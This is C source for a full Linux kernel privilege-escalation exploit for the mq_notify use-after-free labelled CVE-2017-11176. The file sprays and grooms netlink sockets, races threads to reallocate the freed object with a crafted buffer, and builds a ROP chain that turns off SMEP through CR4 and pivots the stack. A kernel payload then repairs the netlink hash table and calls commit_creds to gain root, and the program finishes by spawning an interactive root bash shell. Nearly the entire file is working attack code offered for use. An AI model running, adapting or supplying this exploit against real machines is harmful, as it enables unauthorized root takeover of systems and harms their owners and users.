#define _GNU_SOURCE
// Include {{{
#include "const.h"
#include <asm/types.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <unistd.h>
// }}}
// Definition of system call. We use a wrapper with syscall to avoid the glibc
// code {{{
#define _mqnotify(mqdes, notification)                                         \
  syscall(__NR_mq_notify, mqdes, notification)
#define _socket(domain, type, proto) syscall(__NR_socket, domain, type, proto)
#define _sendmsg(fd, msg, flag) syscall(__NR_sendmsg, fd, msg, flag)
#define _bind(fd, addr, dim) syscall(__NR_bind, fd, addr, dim)
#define _setsockopt(fd, level, option_name, option_value, option_len)          \
  syscall(__NR_setsockopt, fd, level, option_name, option_value, option_len)
#define _close(fd) syscall(__NR_close, fd)
#define _dup(fd) syscall(__NR_dup, fd)
#define _connect(sock, addr, dim) syscall(__NR_connect, sock, addr, dim)
#define _sched_setaffinity(cpu, dim, set)                                      \
  syscall(__NR_sched_setaffinity, cpu, dim, set)
#define _sched_yield() syscall(__NR_sched_yield)
#define _gettid() syscall(__NR_gettid)
#define _getsockname(fd, addr, len) syscall(__NR_getsockname, fd, addr, len)
#define _mmap(addr, len, proto, flag, n1, n2)                                  \
  syscall(__NR_mmap, addr, len, proto, flag, n1, n2)
#define _open(fd, flags) syscall(__NR_open, fd, flags);
#define _read(fd, buffer, bytes) syscall(__NR_read, fd, buffer, bytes)
#define _lseek(fd, bytes, flag) syscall(__NR_lseek, fd, bytes, flag)
// }}}

// Definition of struct wait_queue. {{{
struct list_head {
  struct list_head *next, *prev;
};
struct wait_queue_head {
  int slock;
  struct list_head task_list;
};
typedef int (*wait_queue_func_t)(void *wait, unsigned mode, int flags,
                                 void *key);
#define WQ_FLAG_EXCLUSIVE 0x01
struct wait_queue {
  unsigned int flags;
  void *private;
  wait_queue_func_t func;
  struct list_head task_list;
};
// }}}
// Definition of usefull structure and global variables {{{
// For unblocker thread
struct unl_arg {
  int setsock;
  int close_fd;
  int is_ready;
};
// For reallocation thread
struct realloc_thread_arg {
  pthread_t tid;
  int recv_fd;
  int send_fd;
  int ready;
  struct sockaddr_un addr;
};
static volatile char
    g_realloc_data[KMALLOC_TARGET]; // This array is the reallocation array
static volatile size_t g_do_reallocation =
    0; // Flag for trigger the reallocation threads
static volatile size_t g_thread_ready = 0; // Reallocation thread ready?
static volatile struct wait_queue
    *g_userland_wq; // Fake queue structure for invoking the execution
static volatile struct wait_queue
    g_fake_next_elt;              // We need another queue structure because of
                                  // for_each_bla_safe
static volatile char *fake_stack; // Stack aliasing
static volatile int fd_unlocker;  // FD for unblock target, we need this to
                                  // restore the kernel structures
static volatile int target_pid;   // This PID is used to compute the hash bucket
                                  // for reparation of netlink hashlist

// }}}
// Functions prototypes {{{
int init_realloc_data(void);
int migrate_to_cpu0(void);
// }}}
// Reallocation functions. We create threads that will race with the kernel to
// obtain the freed chunk {{{
static int create_af_unix(struct realloc_thread_arg *arg) {
  printf("[0] %s\n", __FUNCTION__);
  // We create two UNIX socket because we need to sendmsg
  if ((arg->recv_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0 ||
      (arg->send_fd = _socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) {
    perror("[-] socket(af_unix)");
    return -1;
  }
  printf("[0] %s, socket created!\n", __FUNCTION__);
  // Bind the unix socket
  memset(&arg->addr, 0, sizeof(arg->addr));
  arg->addr.sun_family = AF_UNIX;
  sprintf(arg->addr.sun_path + 1, "sock_%lx", _gettid());
  if (_bind(arg->recv_fd, (struct sockaddr *)&arg->addr, sizeof(arg->addr))) {
    perror("[-] bind(af_unix)");
    goto fail;
  }
  printf("[0] %s, socket binded\n", __FUNCTION__);
  // Connect the two sockets
  if (_connect(arg->send_fd, (struct sockaddr *)&arg->addr,
               sizeof(arg->addr))) {
    perror("[-] connect(af_unix)");
    goto fail;
  }
  printf("[0] %s, socket connected\n", __FUNCTION__);
  // Set sockopt for timeo
  // We set timeo to 0 because this means that the we can wait for undefined
  // amount of time
  struct timeval tv;
  memset(&tv, 0, sizeof(tv));
  if (_setsockopt(arg->recv_fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv))) {
    perror("[-] setsockopt(af_unix)");
    goto fail;
  }
  printf("[+] AF_UNIX couple created!\n");
  return 0;
fail:
  close(arg->recv_fd);
  close(arg->send_fd);
  return -1;
}
// This function is the main of the realloc thread.
static void *realloc_thread(void *arg) {
  struct realloc_thread_arg *args = (struct realloc_thread_arg *)arg;
  char buf[200];
  struct iovec iov = {
      .iov_base = buf,
      .iov_len = sizeof(buf),
  };
  struct msghdr msg;
  // Better be safe than sorry
  if (migrate_to_cpu0())
    goto fail;
  printf("[0] Thread %ld: creating AF_UNIX socket\n", _gettid());
  if (create_af_unix(args)) {
    printf("[-] Failed to create AF_UNIX socket\n");
    return NULL;
  }
  // Fill the receiver queue, we can safly use random datas
  memset(&buf, 0xba, 200);
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  while (_sendmsg(args->send_fd, &msg, MSG_DONTWAIT) >
         0) // We perform the same things for make the AF_UNIX socket blocked
            // for the next message
    ;
  if (errno != EAGAIN) {
    perror("[-] sendmsg");
    goto fail;
  }
  // Now we have blocked the socket. The next message we will send if the
  // relocation one so we fill the data with exploitation code
  iov.iov_len = 16;                         // We can use a small buffer for iov
  msg.msg_control = (void *)g_realloc_data; // Use our exploit buffer
  msg.msg_controllen = KMALLOC_TARGET;
  // Now, we can wait for the main thread that it will reach the critical path
  printf("[0] Thread %ld: ready to exploit!\n", _gettid());
  args->ready = 1;
  while (!g_do_reallocation)
    ;
  // This call should be blocked and perform the relocation
  // We need this to be blocking because if it isn't the kernel freed our data

  if (_sendmsg(args->send_fd, &msg, 0) < 0) {
    perror("[-] exploiting sendmsg");
    goto fail;
  }
  return NULL;
fail:
  printf("[-] Realloc thread FAILED!\n");
  return NULL;
}

static int create_realloc_threads(struct realloc_thread_arg *t_arg) {
  printf("[0] %s\n", __FUNCTION__);
  int ths;
  // Create realloc threads
  for (ths = 0; ths < NUMB_THREAD; ths++) {
    t_arg[ths].ready = 0;
    if ((errno = pthread_create(&t_arg[ths].tid, NULL, realloc_thread,
                                &t_arg[ths])) != 0) {
      perror("[-] pthread_realloc_create");
      return -1;
    }
    printf("[0] Created new thread\n");
  }
  printf("[0] Threads are created, now we will wait that they are ready\n");
  for (ths = 0; ths < NUMB_THREAD; ths++)
    if (t_arg[ths].ready != 1) {
      ths = 0;
      _sched_yield();
    }
  printf("[+] All threads are ready for critical path!\n");
  return 0;
}
//}}}
// Create NETLINK socket. These functions are used to create the target AF_NETLINK socket that will be freed {{{

// Structure used to create adjacent sockets
struct sock_pid {
  int fd;
  uint32_t pid;
};
static int create_netlinks(struct sock_pid *sockets) {
  int i;
  struct sock_pid *sp;
  struct sockaddr_nl addr;
  int addr_len = sizeof(addr);
  for (i = 0; i < MAX_CREATE_SOCKS; i++) {
    sp = &sockets[i];
    sp->fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK);
    if (sp->fd < 0) {
      perror("[-] Creation of AF_NETLINK");
      goto fail;
    }
    printf("[0] Socket created! fd = %d\n", sp->fd);
    addr.nl_family = AF_NETLINK;
    addr.nl_pad = 0;
    addr.nl_pid = 0;
    addr.nl_groups = 0;
    if (_bind(sp->fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
      perror("[-] bind");
      goto fail;
    }
    if (_getsockname(sp->fd, &addr, &addr_len)) {
      perror("[-] getsockname");
      goto fail;
    }

    sp->pid = addr.nl_pid;
  }
  return 0;
fail:
  return -1;
}

int parse_netlink_file(int *pid, int proto) {
  int fd = _open("/proc/net/netlink", O_RDONLY);
  if (fd < 0) {
    perror("[-] Open netlink\n");
    goto fail;
  }
  int npid = 0;
  int nreaded;
  char buffer[8192]; // Huge buffer. I hope to read all in one
  char *ptr;
  char *eol_token;
  int byte_readed = 0;
read_next_block:
  memset(&buffer, 0, sizeof(buffer));
  if ((nreaded = _read(fd, buffer, 8192)) < 0) {
    perror("[-] During reading");
    close(fd);
    goto fail;
  }
  if (nreaded == 0)
    goto completed; // Read all
  ptr = buffer;
  if (strstr(ptr, "sk") != NULL) { // Skip the first line
    if ((eol_token = strstr(ptr, "\n")) == NULL) {
      printf("[-] there is no first line or something in net file...");
      close(fd);
      goto fail;
    }
    ptr = eol_token + 1; // Skip the first line
    byte_readed += (eol_token - ptr) + 1;
  }
parse_line:
  if ((eol_token = strstr(ptr, "\n")) == NULL) {
    if (_lseek(fd, byte_readed, SEEK_SET) == -1) {
      perror("[-] lseek");
      close(fd);
      goto fail;
    }
    goto read_next_block;
  } else {
    // Parse the line
    void *cur_addr;
    int cur_proto;
    int cur_pid;
    sscanf(ptr, "%p %d %d", &cur_addr, &cur_proto, &cur_pid);
    if (cur_proto == proto) {
      pid[npid] = cur_pid;
      npid++;
      printf("[0] %p %d %d\n", cur_addr, cur_proto, cur_pid);
    }
    byte_readed += eol_token - ptr + 1;
    ptr = eol_token + 1;
    goto parse_line;
  }
completed:
  return npid;
fail:
  return -1;
}

int create_adjacent_netlink(struct sock_pid *target, struct sock_pid *guard) {
  struct sock_pid sockets[MAX_CREATE_SOCKS];
  int pid[8192];
  int i;
  int flag, j;
  printf("[0] Spraying to create a lot of netlink socket\n");
  if (create_netlinks(sockets) < 0) {
    printf("[-] Netlink creation failed...\n");
    return -1;
  }
  printf("[+] Netlinks created!Next phase, read the proc file!\n");
  // This can be set better... TODO
  int npid = parse_netlink_file(pid, NETLINK_USERSOCK);
  if (npid <= 0) {
    printf("[-] Error in reading file...\n");
    return -1;
  }
  printf("[+] Read the file... now search!\n");
  i = npid;
  while (--i > 0) {
    guard->pid = pid[i];
    target->pid = pid[i - 1];
    flag = 0;
    for (j = 0; j < MAX_CREATE_SOCKS; j++) {
      if (sockets[j].pid == guard->pid) {
        guard->fd = sockets[j].fd;
        flag++;
      } else if (sockets[j].pid == target->pid) {
        target->fd = sockets[j].fd;
        flag++;
      }
      if (flag == 2)
        goto found;
    }
  }
  printf("[-] Adjacent netlink socket not found...\n");
  return -1;
found:
  while (--i >= 0) {
    // do not release the target/guard sockets
    if ((sockets[i].fd != target->fd) && (sockets[i].fd != guard->fd))
      close(sockets[i].fd);
  }
  //PRESS_KEY();
  return 0;
}
int cr_bloc_socket(struct sock_pid *target, struct sock_pid *guard) {
  int len = 1;
  if (_setsockopt(target->fd, SOL_SOCKET, SO_RCVBUF, &len, sizeof(int)) < 0) {
    perror("[!] setsockopt");
    goto fail;
  }
  char buf[1024];
  memset(&buf, 0xba, 1024);
  struct sockaddr_nl addr = {
      .nl_family = AF_NETLINK,
      .nl_pad = 0,
      .nl_pid = target->pid, // use the target's pid
      .nl_groups = 0         // no groups
  };
    target_pid = target->pid;
  struct iovec iov = {
      .iov_base = buf,
      .iov_len = sizeof(buf),
  };
  struct msghdr msg = {.msg_name = &addr,
                       .msg_namelen = sizeof(addr),
                       .msg_iov = &iov,
                       .msg_iovlen = 1,
                       .msg_control = NULL,
                       .msg_controllen = 0,
                       .msg_flags = 0};
  while (_sendmsg(guard->fd, &msg, MSG_DONTWAIT) > 0)
    ;
  if (errno != EAGAIN) {
    perror("[-] sendmsg");
    goto fail;
  }
  return 0;

fail:
  printf("[-] failed to prepare blocking socket\n");
  return -1;
}
/*
int cr_bloc_socket(void){
    int send_fd, recv_fd; // If everything go well, we return recv_fd that is
blocked printf("[o] Entering %s\n", __FUNCTION__); send_fd = _socket(AF_NETLINK,
SOCK_DGRAM, NETLINK_USERSOCK); recv_fd = _socket(AF_NETLINK, SOCK_DGRAM,
NETLINK_USERSOCK); if (send_fd < 0 || recv_fd< 0){ perror("[-] socket"); goto
fail;
    }
    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 1,
        .nl_groups = 0,
    };
    printf("[o] Socket created! send_fd = %d, recv_fd = %d\n", send_fd,
recv_fd); while (_bind(recv_fd, (struct sockaddr*)&addr, sizeof(addr))){ if
(errno != 98){ perror("[-] bind"); goto fail;
        }
        addr.nl_pid++;
    }
    printf("[o] Recv_fd bound to %d\n", addr.nl_pid);
    target_pid = addr.nl_pid;
    int len=1;
    if(_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &len, sizeof(int)) < 0){
        perror("[!] setsockopt");
        goto fail;
    }
    char buf[1024];
    memset(&buf, 0xba, 1024);
    struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf),
    };
    struct msghdr msg = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0
    };
    while(_sendmsg(send_fd, &msg, MSG_DONTWAIT) > 0);
    if (errno != EAGAIN){
        perror("[-] sendmsg");
        goto fail;
    }
    _close(send_fd);
    return recv_fd;
fail:
    return -1;
}*/
// }}}
// Stage 0 of the exploit. These functions create the ROP chain for disabling the SMEP, restoring the kernel stack frame when landing in userspace and repair the kernel structure. {{{ 
//
// Here, we create an alias for stack. Remember the stack pivot we use. This function is a preparation for the next steps
static int allocate_structs(void) {
  void *starting = (void *)0x20000000;
  fake_stack = (char *)_mmap(starting, 4096, PROT_READ | PROT_WRITE,
                             MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS |
                                 MAP_LOCKED | MAP_POPULATE,
                             -1, 0);
  g_userland_wq = (struct wait_queue *)_mmap(
      starting + 0x100000000, 4096, PROT_READ | PROT_WRITE,
      MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1,
      0);
  if (g_userland_wq == MAP_FAILED || fake_stack == MAP_FAILED)
    goto fail;
  printf("[+] Fake stack alias is allocated!\n");
  return 0;
fail:
  printf("[-] Mmap failed!\n");
  return -1;
}
// The following function are used to mimic the hashing function of the kernel,
// for debian8 the function is not exported but this is not a problem, these are
// copied from the kernel code {{{
static inline __u32 rol32(__u32 word, unsigned int shift) {
  return (word << shift) | (word >> (32 - shift));
}
#define __jhash_final(a, b, c)                                                 \
  {                                                                            \
    c ^= b;                                                                    \
    c -= rol32(b, 14);                                                         \
    a ^= c;                                                                    \
    a -= rol32(c, 11);                                                         \
    b ^= a;                                                                    \
    b -= rol32(a, 25);                                                         \
    c ^= b;                                                                    \
    c -= rol32(b, 16);                                                         \
    a ^= c;                                                                    \
    a -= rol32(c, 4);                                                          \
    b ^= a;                                                                    \
    b -= rol32(a, 14);                                                         \
    c ^= b;                                                                    \
    c -= rol32(b, 24);                                                         \
  }

uint32_t __jhash_nwords(uint32_t a, uint32_t b, uint32_t c, uint32_t initval) {
  a += initval;
  b += initval;
  c += initval;

  __jhash_final(a, b, c);

  return c;
}
#define JHASH_INITVAL 0xdeadbeef
uint32_t jhash_1word(uint32_t a, uint32_t initval) {
  return __jhash_nwords(a, 0, 0, initval + JHASH_INITVAL + (1 << 2));
}
// }}}
// here, we mimick some kernel structure. Instead of create the full structure,
// we use a padding. {{{
struct socket {
  char pad[OFFSET_SOCKET];
  void *sk;
};
struct file {
  char pad[OFFSET_FILE];
  void *private_data;
};
struct fdtable {
  char pad[OFFSET_FDT_ARRAY];
  struct file **fd;
};
struct files_struct {
  char pad[OFFSET_FDT];
  struct fdtable *fdt;
};
struct task_struct {
  char pad[FILES_OFFSET];
  struct files_struct *files;
};
struct thread_info {
  // First element
  struct task_struct *task;
  char pad[0];
};

struct hlist_head {
  struct hlist_node *first;
};

struct hlist_node {
  struct hlist_node *next, **pprev;
};

struct nl_portid_hash {
  struct hlist_head *table;
  unsigned long rehash_time;

  unsigned int mask;
  unsigned int shift;

  unsigned int entries;
  unsigned int max_shift;

  uint32_t rnd;
};

struct netlink_table {
  struct nl_portid_hash hash;
  struct hlist_head mc_list;
  // struct listeners __rcu	*listeners;
  void *listeners;
  unsigned int flags;
  unsigned int groups;
  struct mutex *cb_mutex;
  struct module *module;
  int (*bind)(int group);
  void (*unbind)(int group);
  // bool			(*compare)(struct net *net, struct sock *sock);
  void *compare;
  int registered;
};
// }}}
// These three macros are used to obtain the thread_info structure from rsp
#define THREAD_SIZE (4096 << 2)
#define get_thread_info(thread_stack_ptr)                                      \
  ((struct thread_info *)(thread_stack_ptr & ~(THREAD_SIZE - 1)))
#define get_current(thread_stack_ptr)                                          \
  ((struct task_struct *)(get_thread_info(thread_stack_ptr)->task))

void __attribute__((unused)) shellcode(void) {
  // Restore the kernel
  unsigned long rsp;
  __asm__ volatile("movq %%rsp, %0" ::"m"(rsp));
  struct task_struct *current = get_current(rsp);
  struct socket *sock = current->files->fdt->fd[fd_unlocker]->private_data;
  void *sk = sock->sk;
  sock->sk = NULL;
  // Repair the netlink hash table
  // Lock the table
  ((netlink_table_grab)(NETLINK_TABLE_GRAB))();
  struct netlink_table *nl_table = *(struct netlink_table **)NL_TABLE;
  struct nl_portid_hash *hash = &(nl_table[NETLINK_USERSOCK].hash);
  // bucket list
        ((printk)(PRINTK))("rnd %ud", hash->rnd);
  struct hlist_head *bucket =
      &hash->table[jhash_1word(target_pid, hash->rnd) & hash->mask];
  //int j;
  //for(j=0; j< hash->mask; j++){
 //     struct hlist_head *bucket=&hash->table[j];
    struct hlist_node *cur;
  struct hlist_node **pprev = &bucket->first;
    
        ((printk)(PRINTK))("target sk : %p", sk);
        ((printk)(PRINTK))("curr %p:", bucket->first);
  for (cur = bucket->first; cur; pprev = &cur->next, cur = cur->next) {
        ((printk)(PRINTK))("cur->next:%016lx", cur->next);
        void *cr = (void*)cur-CONTAINER_SOCKET;
        ((printk)(PRINTK))("cr: %p", cr);
    if (cr == sk) {
        ((printk)(PRINTK))("YEAH!");
      if (cur->next == (struct hlist_node *)KMALLOC_TARGET)
        cur->next = NULL; // Our element is the last one
      cur->pprev = pprev;
      *(cur->pprev) = cur->next;
      if (cur->next)
        cur->next->pprev = pprev;
      hash->entries--;
      break;
    }
  }
  // Unlock the table
  ((netlink_table_ungrab)(NETLINK_TABLE_UNGRAB))();
  // Getting root
  ((commit_creds)(COMMIT_CREDS))(
      ((prepare_kernel_cred)(PREPARE_KERNEL_CRED))(NULL));
}

// Attribute naked is implemented in GCC 8. I left here as reminder altought not
// working as expected
void __attribute__((naked)) restore_s_frame(void) {
  // I have prologue and epilogue but... who cares?
  __asm__ volatile("xor %rbx, %rbx");         // Clear RBX
  __asm__ volatile("movl $0x20000000, %ebx"); // Use RBX as pointer to retrieve
                                              // previous stored stack frame
  __asm__ volatile("movq 0x18(%rbx), %rax");  // Restore rsp and rbp
  __asm__ volatile("movq 0x08(%rbx), %rcx");
  __asm__ volatile("movq $0xffffffff00000000, %rdx");
  __asm__ volatile("andq %rdx, %rcx"); // We have only the lowest part of rsp
                                       // but we have all rbp
  __asm__ volatile("xor  %rcx, %rax");
  __asm__ volatile("movq 0x08(%rbx), %rbp"); // Restore RBP
  __asm__ volatile("movq %rax, %rsp");       // Restore RSP
  // call the real payload
  __asm__ volatile(
      "call shellcode"); // Call the real payload. We can use C code from here
  // RBX contains the flag, it should be 0x01
  __asm__ volatile("movq $1, %rax"); // return 1
  __asm__ volatile("movq $1, %rbx");
  __asm__ volatile("sti"); // Set to 1 the interrupt
  __asm__ volatile("ret"); // return 1
}
// This function will buil ROP chain in the aliased stack.
void create_rop(void) {
  unsigned long *stack = (unsigned long *)fake_stack;
  // Disable SMEP
  int i = 0;
  // I need to store rax and rbp
  stack[i++] = CLI;      // Clear interrupt bit so we can't be preempted
  stack[i++] = StoreRBP; // push rbp; add rsp, 0x08; pop rbx; ret -- Store RBP
                         // in the stack ad offset 0x08
  stack[i++] = 0xbababababbababab; // Value popped in rbx

  stack[i++] = StoreRAX; // push rax ; add rsp, 8 ; xor eax, eax ; pop rbx ; ret
                         // -- Store RAX in the stack ad offset 0x18
  stack[i++] = 0xefefefefefefefef; // Value popped in rbx

  stack[i++] = MOV_CR4_TO_RAX; // mov cr4, rax; ret -- Copy CR4 to RAX
  stack[i++] = POP_RDX;        // pop rdx; ret
  stack[i++] = SMEP_MASK;      // Mask for disabling SMEP
  stack[i++] = AND_RAX_RDX;    // and rax, rdx; ret; -- Disabling SMEP
  stack[i++] = MOV_EAX_TO_RDI; // movsxd rdi, eax ; pop rbx ; mov rax, rdi ; pop
                               // rbp ; ret -- Move to RDI new CR4 value
  stack[i++] = 0xdeadbeefbabecafe;
  stack[i++] = 0xdeadbeefbabecafe;
  stack[i++] = native_write_cr4; // Call the native_write_cr4 function
  stack[i++] = (unsigned long)&restore_s_frame; // Jump to userland!
  return;
}
// Create reallocation data
int init_realloc_data(void) {
  struct cmsghdr *first;
  int *pid = (int *)&g_realloc_data[NLK_PID];
  void **groups = (void **)&g_realloc_data[NLK_GRO];
  struct wait_queue_head *nlk_wait =
      (struct wait_queue_head *)&g_realloc_data[NLK_WAIT];
  memset((void *)g_realloc_data, 0, KMALLOC_TARGET);
  first = (struct cmsghdr *)g_realloc_data;
  if (allocate_structs() != 0)
    return -1;
  create_rop();
  first->cmsg_len = sizeof(g_realloc_data);
  first->cmsg_level = 0;         // Must be different from SOL_SOCKET = 1
  first->cmsg_type = 0xdeadbeef; // Useless now

  // memset((void *)g_realloc_data + sizeof(struct cmsghdr), 0x41,
  //       KMALLOC_TARGET - sizeof(struct cmsghdr));
#define MAGIC_PID_NUMBER 0xbabecafe
#define MAGIC_GROUP 0x0
  *pid = MAGIC_PID_NUMBER;
  *groups = MAGIC_GROUP;

  nlk_wait->slock = 0x0;
  // Point the list to userland
  nlk_wait->task_list.next = (struct list_head *)&g_userland_wq->task_list.next;
  nlk_wait->task_list.prev = (struct list_head *)&g_userland_wq->task_list;
  g_fake_next_elt.task_list.next = (struct list_head *)&g_fake_next_elt;
  g_fake_next_elt.task_list.prev = (struct list_head *)&g_fake_next_elt;

  g_userland_wq->flags = WQ_FLAG_EXCLUSIVE;
  g_userland_wq->private = (void *)0xb1b2b3b4b5b6b7b8;
  //#define STACK_PIVOT 0xffffffff8100008a // xchg eax, rsp; ret;
  g_userland_wq->func = (wait_queue_func_t)STACK_PIVOT;
  g_userland_wq->task_list.next = (struct list_head *)&g_fake_next_elt;
  g_userland_wq->task_list.prev = (struct list_head *)&g_fake_next_elt;

  return 0;
}
// }}}
// Main functions block. We freed a chunk here {{{
// Utility function
int migrate_to_cpu0(void) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (_sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
    perror("[-] sched_setaffinity");
    return -1;
  }
  return 0;
}
// Function to check if the reallocation is went well
static int check_reallocation(int sock_fd) {
  struct sockaddr_nl addr;
  size_t addr_len = sizeof(addr);
  memset(&addr, 0, sizeof(addr));
  if (_getsockname(sock_fd, &addr, &addr_len)) {
    perror("[-] getsockname check relocation");
    return -1;
  }
  printf("[0] addr_len = %lu\n", addr_len);
  printf("[0] addr.nl_pid = %d\n", addr.nl_pid);
  if (addr.nl_pid != MAGIC_PID_NUMBER) {
    printf("[-] magic PID does not match!\n");
    return -1;
  }
  if (addr.nl_groups != MAGIC_GROUP) {
    printf("[-] groups pointer does not match!\n");
    return -1;
  }
  return 0;
}
// This function is used to unblock the main thread
static void *unblock_thread(void *arg) {
  printf("[0] Entering in %s\n", __FUNCTION__);
  printf("[0] Trying to unblock main thread thanks to setsockopts\n");
  struct unl_arg *a = (struct unl_arg *)arg;
  printf("[0] Calling setsockopt and unblock the main thread\n");
  int val = 5353;
  a->is_ready = 1;
  sleep(5);
  _close(a->close_fd);
  // We use setsockopt to wake_up the main thread
  if (_setsockopt(a->setsock, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val,
                  sizeof(val))) {
    perror("[!] setsockopt");
  }
  printf("[0] Unblock thread success!\n");
  return NULL;
}
// This function trigs the refcounter bug
int decrease_sock(int sock_fd, int unblock_fd) {
  struct sigevent sigev;
  char buff[NOTIFY_COOKIE_LEN];
  struct unl_arg thread_arg;
  memset(&buff, 0xde, NOTIFY_COOKIE_LEN);
  memset(&sigev, 0, sizeof(struct sigevent));
  sigev.sigev_notify = SIGEV_THREAD;
  sigev.sigev_value.sival_ptr = &buff;
  sigev.sigev_signo = sock_fd;
  printf("[0] Unblocker fd:%d\n", unblock_fd);
  thread_arg.setsock = unblock_fd;
  thread_arg.is_ready = 0;
  thread_arg.close_fd = sock_fd;
  pthread_t tid;
  if ((errno = pthread_create(&tid, NULL, unblock_thread, &thread_arg)) != 0) {
    perror("[-] Pthread_Create");
    goto fail;
  }
  printf("[0] Unblocker thread created!\n");
  while (thread_arg.is_ready == 0)
    ;
  // Trigger the BUG!
  _mqnotify(0xdeadbeef, &sigev);
  printf("[+] Main thread is awake!\n");
  return 0;
fail:
  return -1;
}

struct sock_pid g_target, g_guard;
// This function starts all the thread
static inline __attribute__((always_inline)) void do_reallocation(void) {
  g_do_reallocation = 1;
  _sched_yield();
  sleep(5);
}

int main(void) {
  printf("\n\n");
  printf("-={CVE-2017-11176}=-\n");
  printf("\n\n");
  struct realloc_thread_arg rta[NUMB_THREAD];
  if (migrate_to_cpu0()) {
    printf("[-] Failed the migration\n");
    goto fail;
  }
  printf("[+] Successfully migrated to CPU0\n");
  memset(rta, 0, sizeof(rta));
  if (create_realloc_threads(rta)) {
    printf("[-] Realloc threads are broken!\n");
    goto fail;
  }
  printf("[0] Realloc threads are ready to go!\n");
  printf("[0] Creating socket\n");
  if (create_adjacent_netlink(&g_target, &g_guard) < 0) {
    printf("[-] Failed to create adjacent netlink\n");
    goto fail;
  }
  if (init_realloc_data() < 0) {
    printf("[:(] Exploit data not ready\n");
    goto fail;
  }
  printf("[+] netlink candidates ready:\n");
  printf("[+] target.pid = %d\n", g_target.pid);
  printf("[+] guard.pid  = %d\n", g_guard.pid);
  printf("[0] Duplicate sockets\n");
  if (cr_bloc_socket(&g_target, &g_guard) < 0) {
    printf("[-] Failed to block the two netlink socket\n");
    goto fail;
  }
  int sock_fd2;
  if ((fd_unlocker = _dup(g_target.fd)) < 0 ||
      (sock_fd2 = _dup(g_target.fd)) < 0) {
    perror("[-] dup");
    goto fail;
  }
  printf("[?] Try the exploit?\n");
  //PRESS_KEY();
  if (decrease_sock(g_target.fd, fd_unlocker) < 0 ||
      decrease_sock(sock_fd2, fd_unlocker) < 0) {
    printf("[-] Error in decrasing refcounter\n");
    goto fail;
  }
  do_reallocation();
  if (check_reallocation(fd_unlocker) < 0) {
    printf("[-] Reallocation failed!\n");
    goto fail;
  }
  printf("[+] Reallocation succeded!!\n");
  close(g_guard.fd);
  printf("[0] Triggering our code to escalte to root and repair the kernel\n");
  int val = 5353;
  if (_setsockopt(fd_unlocker, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val,
                  sizeof(val))) {
    perror("[-] Last setsockopt");
    goto fail;
  }
  printf("[+] WIN! Popping a shell...\n");
  // Here you can do wathever you want as root
  char *shell = "/bin/bash";
  char *args[] = {shell, "-i", NULL};
  execve(shell, args, NULL);
  return 0;
fail:
  printf("[!] Exploit failed...\n");
  return -1;
}
// }}}
